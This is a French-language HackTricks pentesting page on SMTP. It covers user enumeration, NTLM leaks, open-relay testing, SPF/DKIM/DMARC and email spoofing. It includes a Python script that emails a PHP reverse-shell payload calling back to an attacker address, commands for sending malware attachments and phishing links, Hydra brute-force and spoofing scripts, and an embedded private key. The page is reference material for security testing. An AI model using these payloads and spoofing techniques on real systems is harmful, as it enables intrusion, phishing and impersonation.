# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et votre cloud**

**Trouvez et signalez des vulnérabilités critiques et exploitables ayant un impact commercial réel.** Utilisez nos 20+ outils personnalisés pour cartographier la surface d'attaque, trouver des problèmes de sécurité qui vous permettent d'escalader les privilèges, et utilisez des exploits automatisés pour collecter des preuves essentielles, transformant votre travail acharné en rapports convaincants.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## **Informations de base**

Le **Simple Mail Transfer Protocol (SMTP)** est un protocole utilisé dans la suite TCP/IP pour l'**envoi et la réception d'e-mails**. En raison de ses limitations à mettre en file d'attente les messages à l'extrémité du destinataire, SMTP est souvent utilisé avec **POP3 ou IMAP**. Ces protocoles supplémentaires permettent aux utilisateurs de stocker des messages sur une boîte aux lettres de serveur et de les télécharger périodiquement.

Dans la pratique, il est courant que les **programmes de messagerie** utilisent **SMTP pour envoyer des e-mails**, tout en utilisant **POP3 ou IMAP pour les recevoir**. Sur les systèmes basés sur Unix, **sendmail** se distingue comme le serveur SMTP le plus fréquemment utilisé à des fins de messagerie. Le package commercial connu sous le nom de Sendmail comprend un serveur POP3. De plus, **Microsoft Exchange** fournit un serveur SMTP et offre la possibilité d'inclure un support POP3.

**Port par défaut :** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL Headers

Si vous avez l'opportunité de **faire envoyer un email à la victime** (via le formulaire de contact de la page web par exemple), faites-le car **vous pourriez apprendre sur la topologie interne** de la victime en voyant les en-têtes de l'email.

Vous pouvez également obtenir un email d'un serveur SMTP en essayant de **envoyer à ce serveur un email à une adresse inexistante** (car le serveur enverra à l'attaquant un email NDN). Mais, assurez-vous d'envoyer l'email depuis une adresse autorisée (vérifiez la politique SPF) et que vous pouvez recevoir des messages NDN.

Vous devriez également essayer de **envoyer différents contenus car vous pouvez trouver des informations plus intéressantes** dans les en-têtes comme : `X-Virus-Scanned: by av.domain.com`\
Vous devriez envoyer le fichier de test EICAR.\
Détecter l'**AV** peut vous permettre d'exploiter des **vulnérabilités connues.**

## Basic actions

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS** :
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Trouver les serveurs MX d'une organisation
```bash
dig +short mx google.com
```
### Énumération
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Divulgation d'informations

Si le serveur prend en charge l'authentification NTLM (Windows), vous pouvez obtenir des informations sensibles (versions). Plus d'infos [**ici**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Ou **automatiser** cela avec le plugin **nmap** `smtp-ntlm-info.nse`

### Nom du serveur interne - Divulgation d'informations

Certains serveurs SMTP complètent automatiquement l'adresse d'un expéditeur lorsque la commande "MAIL FROM" est émise sans une adresse complète, divulguant son nom interne :
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

Vérifiez si vous pouvez intercepter des mots de passe à partir des paquets vers le port 25

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Énumération de bruteforce de nom d'utilisateur

**L'authentification n'est pas toujours nécessaire**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Outils automatiques
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et votre cloud**

**Trouvez et signalez des vulnérabilités critiques et exploitables ayant un impact commercial réel.** Utilisez nos 20+ outils personnalisés pour cartographier la surface d'attaque, trouver des problèmes de sécurité qui vous permettent d'escalader les privilèges, et utilisez des exploits automatisés pour collecter des preuves essentielles, transformant votre travail acharné en rapports convaincants.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Rapports DSN

**Rapports de Notification de Statut de Livraison** : Si vous envoyez un **email** à une organisation à une **adresse invalide**, l'organisation vous informera que l'adresse était invalide en vous renvoyant un **mail**. Les **en-têtes** de l'email retourné **contiendront** des **informations sensibles** possibles (comme l'adresse IP des services de mail qui ont interagi avec les rapports ou des informations sur le logiciel antivirus).

## [Commandes](smtp-commands.md)

### Envoyer un Email depuis la console linux
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Envoyer un e-mail avec Python

<details>

<summary>Code Python ici</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

La vulnérabilité SMTP Smuggling permet de contourner toutes les protections SMTP (voir la section suivante pour plus d'informations sur les protections). Pour plus d'informations sur SMTP Smuggling, consultez :

{{#ref}}
smtp-smuggling.md
{{#endref}}

## Contre-mesures contre le spoofing d'e-mail

Les organisations sont empêchées d'avoir des e-mails non autorisés envoyés en leur nom en utilisant **SPF**, **DKIM** et **DMARC** en raison de la facilité de spoofing des messages SMTP.

Un **guide complet sur ces contre-mesures** est disponible à [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [a été "déprécié" en 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Cela signifie qu'au lieu de créer un **enregistrement TXT** dans `_spf.domain.com`, vous le créez dans `domain.com` en utilisant la **même syntaxe**.\
> De plus, pour réutiliser les enregistrements SPF précédents, il est assez courant de trouver quelque chose comme `"v=spf1 include:_spf.google.com ~all"`

**Sender Policy Framework** (SPF) est un mécanisme qui permet aux agents de transfert de courrier (MTA) de vérifier si un hôte envoyant un e-mail est autorisé en interrogeant une liste de serveurs de messagerie autorisés définis par les organisations. Cette liste, qui spécifie les adresses IP/plages, les domaines et d'autres entités **autorisées à envoyer des e-mails au nom d'un nom de domaine**, inclut divers "**Mécanismes**" dans l'enregistrement SPF.

#### Mécanismes

De [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mécanisme | Description                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Correspond toujours ; utilisé pour un résultat par défaut comme `-all` pour toutes les IP non correspondantes aux mécanismes précédents.                                                                                                                                                                                                                                  |
| A         | Si le nom de domaine a un enregistrement d'adresse (A ou AAAA) qui peut être résolu à l'adresse de l'expéditeur, il correspondra.                                                                                                                                                                                                                   |
| IP4       | Si l'expéditeur se trouve dans une plage d'adresses IPv4 donnée, correspondre.                                                                                                                                                                                                                                                                              |
| IP6       | Si l'expéditeur se trouve dans une plage d'adresses IPv6 donnée, correspondre.                                                                                                                                                                                                                                                                              |
| MX        | Si le nom de domaine a un enregistrement MX résolvant à l'adresse de l'expéditeur, il correspondra (c'est-à-dire que le courrier provient de l'un des serveurs de messagerie entrants du domaine).                                                                                                                                                                          |
| PTR       | Si le nom de domaine (enregistrement PTR) pour l'adresse du client se trouve dans le domaine donné et que ce nom de domaine se résout à l'adresse du client (DNS inversé confirmé), correspondre. Ce mécanisme est déconseillé et doit être évité, si possible.                                                                                     |
| EXISTS    | Si le nom de domaine donné se résout à une adresse quelconque, correspondre (peu importe l'adresse à laquelle il se résout). Cela est rarement utilisé. Avec le langage macro SPF, il offre des correspondances plus complexes comme les requêtes DNSBL.                                                                                                                           |
| INCLUDE   | Fait référence à la politique d'un autre domaine. Si la politique de ce domaine passe, ce mécanisme passe. Cependant, si la politique incluse échoue, le traitement continue. Pour déléguer complètement à la politique d'un autre domaine, l'extension de redirection doit être utilisée.                                                                                     |
| REDIRECT  | <p>Une redirection est un pointeur vers un autre nom de domaine qui héberge une politique SPF, elle permet à plusieurs domaines de partager la même politique SPF. Elle est utile lorsqu'on travaille avec un grand nombre de domaines qui partagent la même infrastructure de messagerie.</p><p>La politique SPF du domaine indiqué dans le mécanisme de redirection sera utilisée.</p> |

Il est également possible d'identifier des **Qualificateurs** qui indiquent **ce qui doit être fait si un mécanisme est correspondant**. Par défaut, le **qualificateur "+"** est utilisé (donc si un mécanisme est correspondant, cela signifie qu'il est autorisé).\
Vous remarquerez généralement **à la fin de chaque politique SPF** quelque chose comme : **\~all** ou **-all**. Cela est utilisé pour indiquer que **si l'expéditeur ne correspond à aucune politique SPF, vous devez marquer l'e-mail comme non fiable (\~) ou rejeter (-) l'e-mail.**

#### Qualificateurs

Chaque mécanisme au sein de la politique peut être précédé de l'un des quatre qualificateurs pour définir le résultat prévu :

- **`+`** : Correspond à un résultat PASS. Par défaut, les mécanismes supposent ce qualificateur, rendant `+mx` équivalent à `mx`.
- **`?`** : Représente un résultat NEUTRAL, traité de manière similaire à NONE (aucune politique spécifique).
- **`~`** : Dénote SOFTFAIL, servant de terrain d'entente entre NEUTRAL et FAIL. Les e-mails correspondant à ce résultat sont généralement acceptés mais marqués en conséquence.
- **`-`** : Indique FAIL, suggérant que l'e-mail doit être rejeté.

Dans l'exemple à venir, la **politique SPF de google.com** est illustrée. Notez l'inclusion des politiques SPF de différents domaines au sein de la première politique SPF :
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Traditionnellement, il était possible de falsifier n'importe quel nom de domaine qui n'avait pas de bon/enregistrement SPF. **De nos jours**, si **l'email** provient d'un **domaine sans un enregistrement SPF valide**, il sera probablement **rejeté/marqué comme non fiable automatiquement**.

Pour vérifier le SPF d'un domaine, vous pouvez utiliser des outils en ligne comme : [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM est utilisé pour signer les emails sortants, permettant leur validation par des agents de transfert de mail (MTAs) externes grâce à la récupération de la clé publique du domaine à partir du DNS. Cette clé publique se trouve dans l'enregistrement TXT d'un domaine. Pour accéder à cette clé, il faut connaître à la fois le sélecteur et le nom de domaine.

Par exemple, pour demander la clé, le nom de domaine et le sélecteur sont essentiels. Ceux-ci peuvent être trouvés dans l'en-tête de mail `DKIM-Signature`, par exemple, `d=gmail.com;s=20120113`.

Une commande pour récupérer cette information pourrait ressembler à :
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domain-based Message Authentication, Reporting & Conformance)

DMARC améliore la sécurité des e-mails en s'appuyant sur les protocoles SPF et DKIM. Il définit des politiques qui guident les serveurs de messagerie dans le traitement des e-mails d'un domaine spécifique, y compris comment gérer les échecs d'authentification et où envoyer des rapports sur les actions de traitement des e-mails.

**Pour obtenir l'enregistrement DMARC, vous devez interroger le sous-domaine \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### Tags DMARC

| Nom de tag | But                                          | Exemple                          |
| ---------- | -------------------------------------------- | -------------------------------- |
| v          | Version du protocole                        | v=DMARC1                        |
| pct        | Pourcentage de messages soumis à filtrage   | pct=20                          |
| ruf        | URI de rapport pour les rapports d'analyse   | ruf=mailto:authfail@example.com |
| rua        | URI de rapport des rapports agrégés         | rua=mailto:aggrep@example.com   |
| p          | Politique pour le domaine organisationnel   | p=quarantine                    |
| sp         | Politique pour les sous-domaines de l'OD    | sp=reject                       |
| adkim      | Mode d'alignement pour DKIM                 | adkim=s                         |
| aspf       | Mode d'alignement pour SPF                  | aspf=r                          |

### **Qu'en est-il des sous-domaines ?**

**De** [**ici**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Vous devez avoir des enregistrements SPF séparés pour chaque sous-domaine à partir duquel vous souhaitez envoyer des e-mails.\
Ce qui suit a été initialement publié sur openspf.org, qui était une excellente ressource pour ce genre de choses.

> La question démoniaque : Qu'en est-il des sous-domaines ?
>
> Si je reçois un e-mail de pielovers.demon.co.uk, et qu'il n'y a pas de données SPF pour pielovers, dois-je revenir d'un niveau et tester SPF pour demon.co.uk ? Non. Chaque sous-domaine chez Demon est un client différent, et chaque client peut avoir sa propre politique. Il ne serait pas logique que la politique de Demon s'applique à tous ses clients par défaut ; si Demon veut faire cela, il peut configurer des enregistrements SPF pour chaque sous-domaine.
>
> Donc, le conseil aux éditeurs SPF est le suivant : vous devriez ajouter un enregistrement SPF pour chaque sous-domaine ou nom d'hôte qui a un enregistrement A ou MX.
>
> Les sites avec des enregistrements A ou MX génériques devraient également avoir un enregistrement SPF générique, de la forme : \* IN TXT "v=spf1 -all"

Cela a du sens - un sous-domaine peut très bien être dans un emplacement géographique différent et avoir une définition SPF très différente.

### **Relais Ouvert**

Lorsque des e-mails sont envoyés, il est crucial de s'assurer qu'ils ne soient pas signalés comme spam. Cela est souvent réalisé grâce à l'utilisation d'un **serveur de relais de confiance pour le destinataire**. Cependant, un défi courant est que les administrateurs peuvent ne pas être pleinement conscients des **plages IP sûres à autoriser**. Ce manque de compréhension peut entraîner des erreurs dans la configuration du serveur SMTP, un risque fréquemment identifié lors des évaluations de sécurité.

Une solution de contournement que certains administrateurs utilisent pour éviter les problèmes de livraison d'e-mails, en particulier concernant les communications avec des clients potentiels ou en cours, est de **permettre les connexions depuis n'importe quelle adresse IP**. Cela se fait en configurant le paramètre `mynetworks` du serveur SMTP pour accepter toutes les adresses IP, comme indiqué ci-dessous :
```bash
mynetworks = 0.0.0.0/0
```
Pour vérifier si un serveur de messagerie est un relais ouvert (ce qui signifie qu'il pourrait transférer des e-mails de toute source externe), l'outil `nmap` est couramment utilisé. Il inclut un script spécifique conçu pour tester cela. La commande pour effectuer un scan détaillé sur un serveur (par exemple, avec l'IP 10.10.10.10) sur le port 25 en utilisant `nmap` est :
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Outils**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Vérifiez les erreurs de configuration SPF et DMARC**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Obtenez automatiquement les configurations SPF et DMARC**

### Envoyer un Email Spoof

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**Ou vous pourriez utiliser un outil :**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> Si vous obtenez une **erreur en utilisant la bibliothèque python dkim** pour analyser la clé, n'hésitez pas à utiliser celle-ci.\
> **NOTE** : Ceci est juste un correctif temporaire pour effectuer des vérifications rapides dans les cas où, pour une raison quelconque, la clé privée openssl **ne peut pas être analysée par dkim**.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**Ou vous pourriez le faire manuellement :**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># Cela enverra un message non signé
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **Plus d'infos**

**Trouvez plus d'informations sur ces protections dans** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Autres indicateurs de phishing**

- Âge du domaine
- Liens pointant vers des adresses IP
- Techniques de manipulation de liens
- Pièces jointes suspectes (inhabituelles)
- Contenu d'email cassé
- Valeurs utilisées différentes de celles des en-têtes de mail
- Existence d'un certificat SSL valide et de confiance
- Soumission de la page à des sites de filtrage de contenu web

## Exfiltration via SMTP

**Si vous pouvez envoyer des données via SMTP** [**lisez ceci**](../../generic-hacking/exfiltration.md#smtp)**.**

## Fichier de configuration

### Postfix

Généralement, s'il est installé, dans `/etc/postfix/master.cf` contient **des scripts à exécuter** lorsque, par exemple, un nouvel email est reçu par un utilisateur. Par exemple, la ligne `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` signifie que `/etc/postfix/filtering` sera exécuté si un nouvel email est reçu par l'utilisateur mark.

Autres fichiers de configuration :
```
sendmail.cf
submit.cf
```
## Références

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## Commandes Automatiques HackTricks
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et votre cloud**

**Trouvez et signalez des vulnérabilités critiques et exploitables ayant un impact commercial réel.** Utilisez nos 20+ outils personnalisés pour cartographier la surface d'attaque, trouver des problèmes de sécurité qui vous permettent d'escalader les privilèges, et utilisez des exploits automatisés pour collecter des preuves essentielles, transformant votre travail acharné en rapports convaincants.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{{#include ../../banners/hacktricks-training.md}}
